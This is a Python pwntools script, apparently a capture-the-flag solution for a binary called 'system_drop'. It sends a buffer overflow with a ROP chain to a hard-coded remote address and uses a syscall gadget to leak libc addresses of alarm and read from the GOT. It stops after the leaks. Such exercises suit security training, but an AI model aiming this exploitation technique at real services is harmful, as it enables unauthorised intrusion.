# libc6_2.27-3ubuntu1.4_amd64 

from pwn import *

if __name__ == "__main__":
    io = remote("138.68.178.10", 31949)
    #io = process("./system_drop")

    ret = p64(0x00400416)
    pop_rdi = p64(0x004005d3)
    pop_rsi_pop_r15 = p64(0x004005d1)
    alarm_got = p64(0x00601018)
    read_got = p64(0x00601020)
    syscall = p64(0x0040053b)
    main = p64(0x00400541)

    payload = b"A" * 0x28
    payload += pop_rdi
    payload += p64(1)
    payload += pop_rsi_pop_r15
    payload += alarm_got
    payload += p64(0)
    payload += syscall
    payload += main
    
    io.sendline(payload)
    res = io.recv(256)
    alarm_libc = u64(res[:8])
    print("alarm:", hex(alarm_libc))

    payload = b"A" * 0x28
    payload += pop_rdi
    payload += p64(1)
    payload += pop_rsi_pop_r15
    payload += read_got
    payload += p64(0)
    payload += syscall
    payload += main

    io.sendline(payload)
    res = io.recv(256)
    read_libc = u64(res[:8])
    print("read:", hex(read_libc))

    io.close() 
